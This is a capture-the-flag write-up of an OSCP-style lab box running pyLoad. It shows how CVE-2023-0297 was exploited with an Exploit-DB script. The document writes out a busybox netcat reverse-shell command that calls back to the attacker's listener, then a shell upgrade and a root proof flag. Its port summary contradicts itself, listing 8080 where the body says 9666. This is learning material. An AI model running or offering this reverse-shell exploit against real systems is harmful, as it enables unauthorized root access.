# PyLoader
I'm still shocked at how quick and incredibly easy this was - I went from boot to root in <15mins! 

After Nmap showed responses to `22` and `9666` I checked `9666` in Firefox immediately (while the Nmap scan is still running) as I'm prone to doing for anything I don't immediately recognise. As soon as I saw a page with `pyLoad` I just threw "pyload exploit" into Google, found a bunch of RCE exploits for CVE-2023-0297, and pulled up the entry on Exploit-DB. 

I figured I'd go straight for a reverse shell in the command parameter, and after getting a mistaken connection from a poorly formatted python shell, I ran a busybox reverse shell and immediately got root access!

I'm still a little confused why this box is marked "Intermediate" but I've been pretty sick all day so I'll absolutely take the easy win. I didn't bother looking up a walkthrough for this, so the "Writeup" link above is a GitHub entry on how CVE-2023-0297 was found as background instead.
# Resolution summary
- Ran Nmap to identify ports `22` & `8080`
- Visited html (`9666`) & identified `pyLoad`
- Identified exploit for CVE-2023-0297 and ran against target for reverse shell
- Received reverse shell as `root` so upgraded shell and printed `proof.txt`
## Improved skills
- Exploit identification
## Used tools
- Nmap
- python

# Exploitation
- Identified potential exploit `51532.py` from [Exploit Database](https://www.exploit-db.com/exploits/51532) - copied exploit to local host, started netcat listener on port `4444` and ran exploit with python reverse shell
```
python3 51532.py -u http://192.168.165.26:9666 -c 'busybox nc 192.168.45.200 4444 -e /bin/sh'
```
- Caught reverse shell as `root`
![OSCP - PyLoader - Linux - image3](/files/OSCP%20-%20PyLoader%20-%20Linux%20-%20image3.png)
- Ran `/usr/bin/script -qc /bin/bash /dev/null` to get full shell, then ran `cat /root/proof.txt` to print `b9c8fbfddbc8b37c93422b4d8e14d88e`
